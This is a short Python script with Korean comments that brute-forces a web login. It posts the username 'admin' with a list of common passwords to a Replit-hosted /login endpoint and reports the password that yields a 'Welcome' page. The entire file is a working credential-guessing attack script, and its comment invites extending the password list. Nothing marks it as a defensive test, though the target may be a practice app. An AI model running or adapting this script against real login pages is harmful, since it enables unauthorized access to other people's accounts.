import requests

url = "https://b47bda01-bed6-420e-91a1-8bd138fd806c-00-13yryay7g98u4.sisko.replit.dev/login"
username = "admin"

# 예시 비밀번호 리스트 (여기에 여러 개 넣어보면 돼)
passwords = ["123456", "admin", "password", "supersecret", "letmein"]

for pw in passwords:
    data = {'username': username, 'password': pw}
    res = requests.post(url, data=data)

    if "Welcome" in res.text:
        print(f"[+] 로그인 성공! 비밀번호: {pw}")
        break
    else:
        print(f"[-] 실패: {pw}")